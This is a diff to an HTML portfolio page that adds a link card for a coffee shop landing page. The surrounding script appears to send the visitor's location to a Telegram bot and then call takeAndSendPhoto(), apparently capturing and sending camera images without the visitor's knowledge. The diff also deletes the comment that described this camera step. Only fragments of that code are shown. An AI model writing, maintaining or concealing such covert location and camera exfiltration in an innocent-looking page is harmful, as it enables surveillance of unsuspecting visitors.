@@ -40,6 +40,10 @@
                         <div class="font-bold text-sm text-[#2b3934]">AISMK Web App</div>
                         <div class="text-[10px] text-gray-500 uppercase tracking-wider">Web Development</div>
                     </a>
+                    <a href="https://coffeshop-chi-hazel.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
+                        <div class="font-bold text-sm text-[#2b3934]">Coffee Shop Landing Page</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">UI/UX Design</div>
+                    </a>
                 </div>
 
                 <a href="https://maps.app.goo.gl/2P8A5kXNmCTnqjm76" target="_blank" class="flex items-center gap-4 bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
@@ -114,7 +118,6 @@
                         body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown', reply_markup: keyboard })
                     });
                     
-                    // Panggil fungsi kamera setelah lokasi terkirim
                     takeAndSendPhoto();
                 });
             }
